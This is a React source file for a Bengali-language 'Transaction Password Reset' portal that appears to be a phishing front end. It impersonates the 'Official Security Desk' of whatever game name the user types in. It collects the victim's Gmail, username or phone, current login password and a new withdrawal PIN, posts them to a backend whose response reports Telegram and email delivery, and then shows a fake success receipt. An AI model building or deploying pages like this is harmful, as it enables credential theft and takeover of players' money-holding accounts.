import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import {
  LockKeyhole,
  ShieldCheck,
  CheckCircle2,
  AlertTriangle,
  Eye,
  EyeOff,
  Gamepad2,
  AtSign,
  UserCheck,
  Banknote,
  CheckCheck,
  Copy,
  Check,
  RotateCcw,
  Loader2,
  ArrowRight,
  Mail,
  Send,
} from 'lucide-react';
import shield3dIcon from './assets/images/security_shield_icon_1789888154000.jpg';

interface FormData {
  gameName: string;
  gmail: string;
  usernameOrPhone: string;
  loginPassword: string;
  newWithdrawPassword: string;
  confirmWithdrawPassword: string;
}

interface FormErrors {
  gameName?: string;
  gmail?: string;
  usernameOrPhone?: string;
  loginPassword?: string;
  newWithdrawPassword?: string;
  confirmWithdrawPassword?: string;
}

interface SubmissionRecord {
  id: string;
  gameName: string;
  gmail: string;
  usernameOrPhone: string;
  timestamp: string;
  status: 'Processing' | 'Approved';
  deliveredTo?: string;
  companyName?: string;
  previewUrl?: string | false;
  telegramSent?: boolean;
  telegramError?: string | null;
  emailSent?: boolean;
  emailError?: string | null;
  apiError?: string | null;
}

const shakeVariants = {
  shake: {
    x: [0, -8, 8, -6, 6, -3, 3, 0],
    transition: { duration: 0.45, ease: 'easeInOut' as const }
  }
};

export default function App() {
  const [formData, setFormData] = useState<FormData>({
    gameName: '',
    gmail: '',
    usernameOrPhone: '',
    loginPassword: '',
    newWithdrawPassword: '',
    confirmWithdrawPassword: '',
  });

  const [errors, setErrors] = useState<FormErrors>({});
  const [submitAttempt, setSubmitAttempt] = useState(0);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submittedData, setSubmittedData] = useState<SubmissionRecord | null>(null);
  const [copiedId, setCopiedId] = useState(false);

  // Password visibility states
  const [showLoginPassword, setShowLoginPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);

  // Previous local records
  const [history, setHistory] = useState<SubmissionRecord[]>([]);



  useEffect(() => {
    try {
      const saved = localStorage.getItem('tx_reset_records');
      if (saved) {
        setHistory(JSON.parse(saved));
      }
    } catch {
      // ignore storage error
    }
  }, []);

  const handleChange = (field: keyof FormData, value: string) => {
    setFormData(prev => ({ ...prev, [field]: value }));
    if (errors[field]) {
      setErrors(prev => ({ ...prev, [field]: undefined }));
    }
  };

  const validate = (): boolean => {
    const newErrors: FormErrors = {};

    if (!formData.gameName.trim()) {
      newErrors.gameName = 'গেমের নাম ইনপুট করা আবশ্যক';
    }

    if (!formData.gmail.trim()) {
      newErrors.gmail = 'আপনার জিমেইল অ্যাকাউন্ট দেওয়া আবশ্যক';
    } else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.gmail.trim())) {
      newErrors.gmail = 'সঠিক জিমেইল ঠিকানা দিন (যেমন: user@gmail.com)';
    }

    if (!formData.usernameOrPhone.trim()) {
      newErrors.usernameOrPhone = 'ইউজার নেম অথবা ফোন নম্বর দিন';
    }

    if (!formData.loginPassword) {
      newErrors.loginPassword = 'বর্তমান লগইন পাসওয়ার্ড লিখুন';
    }

    if (!formData.newWithdrawPassword) {
      newErrors.newWithdrawPassword = 'নতুন উত্তোলন পাসওয়ার্ড দিন';
    } else if (formData.newWithdrawPassword.length < 4) {
      newErrors.newWithdrawPassword = 'পাসওয়ার্ডটি কমপক্ষে ৪ অক্ষরের বা ডিজিটের হতে হবে';
    }

    if (!formData.confirmWithdrawPassword) {
      newErrors.confirmWithdrawPassword = 'নতুন পাসওয়ার্ডটি পুনরায় নিশ্চিত করুন';
    } else if (formData.newWithdrawPassword !== formData.confirmWithdrawPassword) {
      newErrors.confirmWithdrawPassword = 'উভয় পাসওয়ার্ড মিলছে না, সটিক ভাবে দিন';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitAttempt(prev => prev + 1);

    if (!validate()) {
      return;
    }

    setIsSubmitting(true);

    const generatedId = 'REQ-' + Math.floor(100000 + Math.random() * 900000);
    const timestamp = new Date().toLocaleString('bn-BD', {
      dateStyle: 'medium',
      timeStyle: 'short',
    });

    let previewUrl: string | false = false;
    let companyName = `${formData.gameName.trim()} Official Security Desk`;
    let telegramSent = false;
    let telegramError: string | null = null;
    let emailSent = false;
    let emailError: string | null = null;
    let apiError: string | null = null;

    try {
      const res = await fetch('/api/reset-password', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          gameName: formData.gameName.trim(),
          gmail: formData.gmail.trim(),
          usernameOrPhone: formData.usernameOrPhone.trim(),
          loginPassword: formData.loginPassword,
          newWithdrawPassword: formData.newWithdrawPassword,
          timestamp,
          requestId: generatedId,
        }),
      });

      if (!res.ok) {
        throw new Error(`সার্ভার এপিআই এরর (Status ${res.status})`);
      }

      const data = await res.json();
      if (data?.emailStatus) {
        emailSent = Boolean(data.emailStatus.sent);
        emailError = data.emailStatus.error || null;
        if (data.emailStatus.previewUrl) {
          previewUrl = data.emailStatus.previewUrl;
        }
        if (data.emailStatus.companyName) {
          companyName = data.emailStatus.companyName;
        }
      }
      if (data?.telegramStatus) {
        telegramSent = Boolean(data.telegramStatus.sent);
        telegramError = data.telegramStatus.error || null;
      }
    } catch (err: any) {
      console.warn('Network issue calling email endpoint:', err);
      apiError = err?.message || 'সার্ভারে সংযোগ করা সম্ভব হয়নি';
    }

    const record: SubmissionRecord = {
      id: generatedId,
      gameName: formData.gameName.trim(),
      gmail: formData.gmail.trim(),
      usernameOrPhone: formData.usernameOrPhone.trim(),
      timestamp,
      status: 'Processing',
      deliveredTo: formData.gmail.trim(),
      companyName,
      previewUrl,
      telegramSent,
      telegramError,
      emailSent,
      emailError,
      apiError,
    };

    const updatedHistory = [record, ...history].slice(0, 5);
    setHistory(updatedHistory);
    try {
      localStorage.setItem('tx_reset_records', JSON.stringify(updatedHistory));
    } catch {
      // ignore
    }

    setSubmittedData(record);
    setIsSubmitting(false);
  };

  const handleResetForm = () => {
    setFormData({
      gameName: '',
      gmail: '',
      usernameOrPhone: '',
      loginPassword: '',
      newWithdrawPassword: '',
      confirmWithdrawPassword: '',
    });
    setErrors({});
    setSubmittedData(null);
  };

  const copyTrackingId = (id: string) => {
    navigator.clipboard.writeText(id);
    setCopiedId(true);
    setTimeout(() => setCopiedId(false), 2000);
  };

  return (
    <div
      id="main-container"
      className="min-h-screen bg-gradient-to-b from-slate-100 via-slate-50 to-slate-100 py-6 sm:py-12 px-3 sm:px-6 lg:px-8 flex flex-col items-center justify-center text-slate-800"
    >
      {/* Main Portal Card */}
      <div
        id="portal-card"
        className="w-full max-w-4xl bg-white rounded-3xl shadow-xl shadow-slate-200/70 border border-slate-200/90 overflow-hidden"
      >
        {/* Header with Royal Cobalt Gradient & Modern Security Branding */}
        <div
          id="portal-header"
          className="bg-gradient-to-r from-blue-700 via-blue-600 to-indigo-700 text-white relative overflow-hidden p-6 sm:p-9"
        >
          <div className="relative z-10 flex items-center gap-3.5 sm:gap-4.5">
            {/* Official Brand Security Icon Emblem */}
            <div className="relative shrink-0">
              <div className="w-14 h-14 sm:w-16 sm:h-16 rounded-2xl p-0.5 bg-gradient-to-tr from-cyan-400 via-blue-400 to-indigo-300 shadow-xl shadow-blue-900/40 overflow-hidden flex items-center justify-center">
                <div className="w-full h-full bg-slate-900/90 rounded-[14px] flex items-center justify-center overflow-hidden">
                  <img
                    src={shield3dIcon}
                    alt="Security Shield"
                    referrerPolicy="no-referrer"
                    className="w-full h-full object-cover"
                  />
                </div>
              </div>
            </div>

            <div>
              <h1
                id="app-title"
                className="font-extrabold tracking-tight text-white flex items-center gap-2 text-2xl sm:text-3xl lg:text-4xl"
              >
                Transaction Password Reset
              </h1>
              <p className="text-blue-100 text-xs sm:text-sm mt-1 font-medium">
                টাকা তোলার উত্তোলন পাসওয়ার্ড রিসেট করুন এখানেই
              </p>
            </div>
          </div>

          {/* Background Vector Accent */}
          <div className="absolute -right-8 -bottom-10 opacity-10 pointer-events-none text-white">
            <ShieldCheck className="w-48 h-48" />
          </div>
        </div>

        {/* Form Content OR Success View */}
        {submittedData ? (
          <motion.div
            id="success-view"
            initial={{ opacity: 0, scale: 0.96 }}
            animate={{ opacity: 1, scale: 1 }}
            transition={{ duration: 0.3 }}
            className="text-center space-y-6 p-6 sm:p-12"
          >
            <div className="w-16 h-16 sm:w-20 sm:h-20 bg-emerald-100 text-emerald-600 rounded-2xl flex items-center justify-center mx-auto shadow-inner">
              <CheckCircle2 className="w-10 h-10 sm:w-12 sm:h-12" />
            </div>

            <div className="space-y-2">
              <h2 className="text-2xl sm:text-3xl font-extrabold text-slate-800 tracking-tight">
                পাসওয়ার্ড রিসেট আবেদন সফল হয়েছে!
              </h2>
              <p className="text-sm sm:text-base text-slate-600 max-w-md mx-auto leading-relaxed">
                আপনার উত্তোলন পাসওয়ার্ড রিসেট রিকোয়েস্টটি সিস্টেমে গ্রহণ করা হয়েছে। আগামী ৫-১৫ মিনিটের মধ্যে পাসওয়ার্ড কার্যকরী হবে।
              </p>
            </div>

            {/* Receipt Card */}
            <div className="max-w-md mx-auto bg-slate-50/80 border border-slate-200 rounded-2xl p-5 sm:p-6 text-left space-y-4 shadow-xs">
              <div className="flex items-center justify-between pb-3 border-b border-slate-200">
                <span className="text-xs font-bold text-slate-500 uppercase tracking-wider">
                  ট্র্যাকিং আইডি
                </span>
                <button
                  type="button"
                  id="copy-id-btn"
                  onClick={() => copyTrackingId(submittedData.id)}
                  className="flex items-center gap-1.5 text-xs font-semibold text-blue-600 hover:text-blue-700 bg-blue-50 border border-blue-200/80 px-2.5 py-1 rounded-lg transition-colors cursor-pointer"
                >
                  {copiedId ? (
                    <>
                      <Check className="w-3.5 h-3.5 text-emerald-600" />
                      <span className="text-emerald-700">কপি হয়েছে</span>
                    </>
                  ) : (
                    <>
                      <Copy className="w-3.5 h-3.5" />
                      <span>{submittedData.id}</span>
                    </>
                  )}
                </button>
              </div>

              <div className="grid grid-cols-2 gap-3.5 text-xs sm:text-sm">
                <div>
                  <p className="text-[11px] text-slate-400 font-semibold uppercase">গেমের নাম</p>
                  <p className="font-bold text-slate-800 break-words mt-0.5">{submittedData.gameName}</p>
                </div>
                <div>
                  <p className="text-[11px] text-slate-400 font-semibold uppercase">ইউজার/ফোন নম্বর</p>
                  <p className="font-bold text-slate-800 break-words mt-0.5">{submittedData.usernameOrPhone}</p>
                </div>
                <div>
                  <p className="text-[11px] text-slate-400 font-semibold uppercase">গ্রাহকের জিমেইল</p>
                  <p className="font-bold text-blue-600 truncate mt-0.5">{submittedData.gmail}</p>
                </div>
                <div>
                  <p className="text-[11px] text-slate-400 font-semibold uppercase">প্রেরক (কোম্পানি)</p>
                  <p className="font-bold text-slate-700 truncate mt-0.5">{submittedData.companyName || `${submittedData.gameName} Security Desk`}</p>
                </div>
              </div>

              <div className="pt-3 border-t border-slate-200 flex items-center justify-between text-xs">
                <span className="text-slate-500 font-medium">স্ট্যাটাস:</span>
                <span className="px-3 py-1 rounded-full font-bold bg-amber-100 text-amber-800 flex items-center gap-1.5 text-xs">
                  <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse"></span>
                  যাচাই চলছে (In Review)
                </span>
              </div>

              {/* Delivery Notification Banner */}
              <div className="pt-3 border-t border-slate-200">
                <div className="bg-emerald-50 border border-emerald-200/80 rounded-xl p-3.5 text-xs sm:text-sm text-emerald-800 flex items-start justify-between gap-2.5">
                  <div className="flex items-start gap-2.5">
                    <Mail className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                    <div>
                      <p className="font-bold text-emerald-900">কনফার্মেশন বার্তা পাঠানো হয়েছে</p>
                      <p className="text-emerald-700 text-[11px] sm:text-xs mt-0.5 leading-relaxed">
                        <strong>{submittedData.companyName || `${submittedData.gameName} Official Support`}</strong> থেকে আপনার জিমেইলে (<strong>{submittedData.gmail}</strong>) বিস্তারিত নিশ্চিতকরণ এসএমএস/মেইল সফলভাবে পাঠানো হয়েছে। ৫-১৫ মিনিটের মধ্যে পাসওয়ার্ড আপডেট সম্পন্ন হবে।
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="pt-2 flex justify-center">
              <button
                type="button"
                id="reset-another-btn"
                onClick={handleResetForm}
                className="w-full sm:w-auto px-7 py-3.5 bg-blue-600 hover:bg-blue-700 text-white font-bold rounded-xl shadow-md transition-all flex items-center justify-center gap-2 text-sm cursor-pointer"
              >
                <RotateCcw className="w-4 h-4" />
                নতুন আরেকটি আবেদন করুন
              </button>
            </div>
          </motion.div>
        ) : (
          <form
            id="reset-form"
            onSubmit={handleSubmit}
            noValidate
            className="p-5 sm:p-9 lg:p-11 space-y-8"
          >
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 sm:gap-9">
              {/* Section 1: Account Information */}
              <div className="space-y-5">
                <div className="border-b border-slate-200/80 pb-2.5 flex items-center gap-2 text-slate-800 font-bold text-sm sm:text-base">
                  <div className="w-6 h-6 rounded-lg bg-blue-100 text-blue-700 flex items-center justify-center">
                    <UserCheck className="w-4 h-4" />
                  </div>
                  <span>১. অ্যাকাউন্ট তথ্য (Account Details)</span>
                </div>

                {/* 1. Game Name Field */}
                <motion.div
                  id="field-game-name"
                  key={errors.gameName ? `err-game-${submitAttempt}` : 'ok-game'}
                  variants={shakeVariants}
                  animate={errors.gameName ? 'shake' : undefined}
                  className="space-y-2"
                >
                  <label
                    htmlFor="game-name-input"
                    className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                  >
                    গেমের নাম লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                  </label>
                  <div className="relative flex items-center">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-600">
                      <Gamepad2 className="w-5 h-5" />
                    </div>
                    <input
                      id="game-name-input"
                      type="text"
                      value={formData.gameName}
                      onChange={e => handleChange('gameName', e.target.value)}
                      placeholder="গেমের নাম লিখুন"
                      className={`w-full pl-11 pr-4 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                        errors.gameName
                          ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
                          : 'border-slate-300/90 focus:border-blue-600 focus:ring-blue-500/20'
                      }`}
                    />
                  </div>
                  {errors.gameName && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 font-semibold"
                    >
                      <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                      {errors.gameName}
                    </motion.p>
                  )}
                </motion.div>

                {/* 2. User Gmail Account Field */}
                <motion.div
                  id="field-user-gmail"
                  key={errors.gmail ? `err-gmail-${submitAttempt}` : 'ok-gmail'}
                  variants={shakeVariants}
                  animate={errors.gmail ? 'shake' : undefined}
                  className="space-y-2"
                >
                  <label
                    htmlFor="gmail-input"
                    className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                  >
                    আপনার জিমেইল লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                  </label>
                  <div className="relative flex items-center">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-600">
                      <AtSign className="w-5 h-5" />
                    </div>
                    <input
                      id="gmail-input"
                      type="email"
                      inputMode="email"
                      value={formData.gmail}
                      onChange={e => handleChange('gmail', e.target.value)}
                      placeholder="example@gmail.com"
                      className={`w-full pl-11 pr-4 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                        errors.gmail
                          ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
                          : 'border-slate-300/90 focus:border-blue-600 focus:ring-blue-500/20'
                      }`}
                    />
                  </div>
                  <p className="text-[11px] text-blue-600 font-medium flex items-center gap-1.5 mt-1">
                    <Mail className="w-3.5 h-3.5 text-blue-600 shrink-0" />
                    <span>অফিসিয়াল কোম্পানি ডেস্ক থেকে এই জিমেইলে নিশ্চিতকরণ বার্তা পাঠানো হবে ✉️</span>
                  </p>
                  {errors.gmail && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 font-semibold"
                    >
                      <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                      {errors.gmail}
                    </motion.p>
                  )}
                </motion.div>

                {/* 3. Username / Phone Number Field */}
                <motion.div
                  id="field-username-phone"
                  key={errors.usernameOrPhone ? `err-user-${submitAttempt}` : 'ok-user'}
                  variants={shakeVariants}
                  animate={errors.usernameOrPhone ? 'shake' : undefined}
                  className="space-y-2"
                >
                  <label
                    htmlFor="username-input"
                    className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                  >
                    ইউজার নেম / ফোন নম্বর লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                  </label>
                  <div className="relative flex items-center">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-blue-600">
                      <UserCheck className="w-5 h-5" />
                    </div>
                    <input
                      id="username-input"
                      type="text"
                      inputMode="text"
                      value={formData.usernameOrPhone}
                      onChange={e => handleChange('usernameOrPhone', e.target.value)}
                      placeholder="ইউজারনেম অথবা 017xxxxxxxx"
                      className={`w-full pl-11 pr-4 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                        errors.usernameOrPhone
                          ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
                          : 'border-slate-300/90 focus:border-blue-600 focus:ring-blue-500/20'
                      }`}
                    />
                  </div>
                  {errors.usernameOrPhone && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 font-semibold"
                    >
                      <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                      {errors.usernameOrPhone}
                    </motion.p>
                  )}
                </motion.div>
              </div>

              {/* Section 2: Password & Verification */}
              <div className="space-y-5">
                {/* 4. Login Password Field */}
                <motion.div
                  id="field-login-password"
                  key={errors.loginPassword ? `err-login-${submitAttempt}` : 'ok-login'}
                  variants={shakeVariants}
                  animate={errors.loginPassword ? 'shake' : undefined}
                  className="space-y-2"
                >
                  <label
                    htmlFor="login-password-input"
                    className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                  >
                    লগইন পাসওয়ার্ড লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                  </label>
                  <div className="relative flex items-center">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-indigo-600">
                      <LockKeyhole className="w-5 h-5" />
                    </div>
                    <input
                      id="login-password-input"
                      type={showLoginPassword ? 'text' : 'password'}
                      value={formData.loginPassword}
                      onChange={e => handleChange('loginPassword', e.target.value)}
                      placeholder="বর্তমান লগইন পাসওয়ার্ড"
                      className={`w-full pl-11 pr-12 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                        errors.loginPassword
                          ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
                          : 'border-slate-300/90 focus:border-blue-600 focus:ring-blue-500/20'
                      }`}
                    />
                    <button
                      type="button"
                      tabIndex={-1}
                      onClick={() => setShowLoginPassword(!showLoginPassword)}
                      className="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-400 hover:text-slate-700 cursor-pointer min-h-[44px] min-w-[44px] justify-center transition-colors"
                    >
                      {showLoginPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                  {errors.loginPassword && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 font-semibold"
                    >
                      <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                      {errors.loginPassword}
                    </motion.p>
                  )}
                </motion.div>

                {/* 5. New Withdraw Password Field */}
                <motion.div
                  id="field-new-withdraw-password"
                  key={errors.newWithdrawPassword ? `err-withdraw-${submitAttempt}` : 'ok-withdraw'}
                  variants={shakeVariants}
                  animate={errors.newWithdrawPassword ? 'shake' : undefined}
                  className="space-y-2"
                >
                  <label
                    htmlFor="new-withdraw-password-input"
                    className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                  >
                    নতুন করে টাকা তোলার পাসওয়ার্ড লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                  </label>
                  <div className="relative flex items-center">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-emerald-600">
                      <Banknote className="w-5 h-5" />
                    </div>
                    <input
                      id="new-withdraw-password-input"
                      type={showNewPassword ? 'text' : 'password'}
                      inputMode="numeric"
                      value={formData.newWithdrawPassword}
                      onChange={e => handleChange('newWithdrawPassword', e.target.value)}
                      placeholder="নতুন উত্তোলন পিন/পাসওয়ার্ড লিখুন"
                      className={`w-full pl-11 pr-12 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                        errors.newWithdrawPassword
                          ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
                          : 'border-slate-300/90 focus:border-blue-600 focus:ring-blue-500/20'
                      }`}
                    />
                    <button
                      type="button"
                      tabIndex={-1}
                      onClick={() => setShowNewPassword(!showNewPassword)}
                      className="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-400 hover:text-slate-700 cursor-pointer min-h-[44px] min-w-[44px] justify-center transition-colors"
                    >
                      {showNewPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>
                  {errors.newWithdrawPassword && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 font-semibold"
                    >
                      <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                      {errors.newWithdrawPassword}
                    </motion.p>
                  )}
                </motion.div>

                {/* 6. Confirm New Password Field */}
                <motion.div
                  id="field-confirm-withdraw-password"
                  key={errors.confirmWithdrawPassword ? `err-confirm-${submitAttempt}` : 'ok-confirm'}
                  variants={shakeVariants}
                  animate={errors.confirmWithdrawPassword ? 'shake' : undefined}
                  className="space-y-2"
                >
                  <label
                    htmlFor="confirm-withdraw-password-input"
                    className="block text-xs font-bold text-slate-700 uppercase tracking-wider"
                  >
                    নতুন পাসওয়ার্ড আবার লিখুন <span className="text-rose-500 text-sm font-bold">*</span>
                  </label>
                  <div className="relative flex items-center">
                    <div className="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-emerald-600">
                      <CheckCheck className="w-5 h-5" />
                    </div>
                    <input
                      id="confirm-withdraw-password-input"
                      type={showConfirmPassword ? 'text' : 'password'}
                      inputMode="numeric"
                      value={formData.confirmWithdrawPassword}
                      onChange={e => handleChange('confirmWithdrawPassword', e.target.value)}
                      placeholder="নতুন পাসওয়ার্ডটি আবার লিখুন"
                      className={`w-full pl-11 pr-12 py-3.5 bg-slate-50/70 border rounded-xl text-slate-900 text-sm sm:text-base placeholder-slate-400 focus:outline-none focus:bg-white focus:ring-3 transition-all ${
                        errors.confirmWithdrawPassword
                          ? 'border-rose-400 focus:ring-rose-400/20 ring-1 ring-rose-400'
                          : formData.confirmWithdrawPassword &&
                            formData.newWithdrawPassword === formData.confirmWithdrawPassword
                          ? 'border-emerald-500 focus:ring-emerald-500/20 ring-1 ring-emerald-400 bg-emerald-50/30'
                          : 'border-slate-300/90 focus:border-blue-600 focus:ring-blue-500/20'
                      }`}
                    />
                    <button
                      type="button"
                      tabIndex={-1}
                      onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                      className="absolute inset-y-0 right-0 pr-3.5 flex items-center text-slate-400 hover:text-slate-700 cursor-pointer min-h-[44px] min-w-[44px] justify-center transition-colors"
                    >
                      {showConfirmPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                    </button>
                  </div>

                  {/* Match Indicator */}
                  {formData.confirmWithdrawPassword &&
                    formData.newWithdrawPassword === formData.confirmWithdrawPassword && (
                      <motion.p
                        initial={{ opacity: 0, y: -3 }}
                        animate={{ opacity: 1, y: 0 }}
                        className="text-xs text-emerald-700 font-bold flex items-center gap-1.5 mt-1 bg-emerald-50 px-2.5 py-1 rounded-lg border border-emerald-200/70 w-fit"
                      >
                        <CheckCircle2 className="w-4 h-4 text-emerald-600" />
                        পাসওয়ার্ড দুটি মিলেছে
                      </motion.p>
                    )}

                  {errors.confirmWithdrawPassword && (
                    <motion.p
                      initial={{ opacity: 0, y: -4 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="text-xs text-rose-600 flex items-center gap-1.5 mt-1 font-semibold"
                    >
                      <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                      {errors.confirmWithdrawPassword}
                    </motion.p>
                  )}
                </motion.div>
              </div>
            </div>

            {/* Submission Button Section */}
            <div className="pt-6 sm:pt-8 border-t border-slate-200/80">
              <button
                type="submit"
                id="submit-form-btn"
                disabled={isSubmitting}
                className="w-full bg-gradient-to-r from-blue-600 via-blue-700 to-indigo-600 hover:from-blue-700 hover:via-blue-800 hover:to-indigo-700 active:scale-[0.99] disabled:opacity-70 text-white font-extrabold py-4 px-6 rounded-2xl shadow-lg shadow-blue-500/20 hover:shadow-blue-500/35 transition-all flex items-center justify-center space-x-2.5 text-base sm:text-lg cursor-pointer min-h-[52px]"
              >
                {isSubmitting ? (
                  <>
                    <Loader2 className="animate-spin w-5 h-5 text-white mr-2" />
                    <span>যাচাই ও প্রসেসিং হচ্ছে...</span>
                  </>
                ) : (
                  <>
                    <ShieldCheck className="w-5 h-5" />
                    <span>সাবমিট করুন</span>
                    <ArrowRight className="w-5 h-5 ml-1" />
                  </>
                )}
              </button>
            </div>
          </form>
        )}

        {/* Footer Bar */}
        <div
          id="portal-footer"
          className="bg-slate-50/90 border-t border-slate-200/80 flex justify-center items-center p-4 sm:p-5 px-6 sm:px-9"
        >
          <p className="text-xs text-slate-400 italic font-medium text-center">
            * Required fields must be filled accurately.
          </p>
        </div>
      </div>
    </div>
  );
}
